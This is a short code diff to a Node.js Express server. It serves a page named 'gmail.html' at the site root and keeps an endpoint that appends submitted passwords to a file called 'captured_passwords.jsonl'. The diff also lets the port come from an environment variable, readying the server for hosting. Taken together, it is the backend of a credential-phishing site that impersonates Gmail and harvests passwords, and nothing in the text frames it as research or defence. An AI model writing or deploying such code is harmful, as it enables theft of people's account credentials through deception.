@@ -3,7 +3,11 @@ const fs = require("fs");
 const app = express();
 app.use(express.json());
 app.use(express.static(__dirname));
+const path = require("path");
 
+app.get("/", (req, res) => {
+  res.sendFile(path.join(__dirname, "gmail.html"));
+});
 app.post("/api/save-password", (req, res) => {
   const entry = { ...req.body, savedAt: new Date().toISOString() };
   fs.appendFileSync("captured_passwords.jsonl", JSON.stringify(entry) + "\n");
@@ -11,4 +15,4 @@ app.post("/api/save-password", (req, res) => {
   res.json({ ok: true });
 });
 
-app.listen(3000, () => console.log("Running at http://localhost:3000"));
+app.listen(process.env.PORT || 3000, () => console.log(`Running at port ${process.env.PORT || 3000}`));
